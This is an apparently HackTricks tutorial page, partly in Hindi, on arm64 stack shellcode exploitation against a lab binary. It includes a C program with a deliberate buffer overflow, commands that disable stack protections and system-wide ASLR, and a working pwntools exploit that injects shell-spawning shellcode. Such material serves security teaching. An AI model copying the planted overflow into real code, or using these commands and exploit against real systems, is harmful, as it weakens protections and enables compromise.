# Stack Shellcode - arm64

{{#include ../../../banners/hacktricks-training.md}}

arm64 का परिचय पढ़ने के लिए:

{{#ref}}
../../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

## Linux

### Code
```c
#include <stdio.h>
#include <unistd.h>

void vulnerable_function() {
char buffer[64];
read(STDIN_FILENO, buffer, 256); // <-- bof vulnerability
}

int main() {
vulnerable_function();
return 0;
}
```
Compile के बिना pie, canary और nx:
```bash
clang -o bof bof.c -fno-stack-protector -Wno-format-security -no-pie -z execstack
```
### No ASLR & No canary - Stack Overflow

ASLR को रोकने के लिए चलाएँ:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
प्राप्त करने के लिए [**offset of the bof check this link**](../ret2win/ret2win-arm64.md#finding-the-offset).

Exploit:
```python
from pwn import *

# Load the binary
binary_name = './bof'
elf = context.binary = ELF(binary_name)

# Generate shellcode
shellcode = asm(shellcraft.sh())

# Start the process
p = process(binary_name)

# Offset to return address
offset = 72

# Address in the stack after the return address
ret_address = p64(0xfffffffff1a0)

# Craft the payload
payload = b'A' * offset + ret_address + shellcode

print("Payload length: "+ str(len(payload)))

# Send the payload
p.send(payload)

# Drop to an interactive session
p.interactive()
```
The only "complicated" thing to find here would be the address in the stack to call. In my case I generated the exploit with the address found using gdb, but then when exploiting it it didn't work (because the stack address changed a bit).

मैंने जनरेट किया हुआ **`core` file** (`gdb ./bog ./core`) खोला और shellcode की शुरुआत का असली address चेक किया।


## macOS

> [!TIP]
> macOS में NX को disable करना संभव नहीं है क्योंकि arm64 में यह mode हार्डवेयर स्तर पर लागू होता है, इसलिए इसे disable नहीं किया जा सकता, इसलिए आप macOS में stack में shellcode वाले उदाहरण नहीं पाएँगे।

Check a macOS ret2win example in:

{{#ref}}
../ret2win/ret2win-arm64.md
{{#endref}}


{{#include ../../../banners/hacktricks-training.md}}
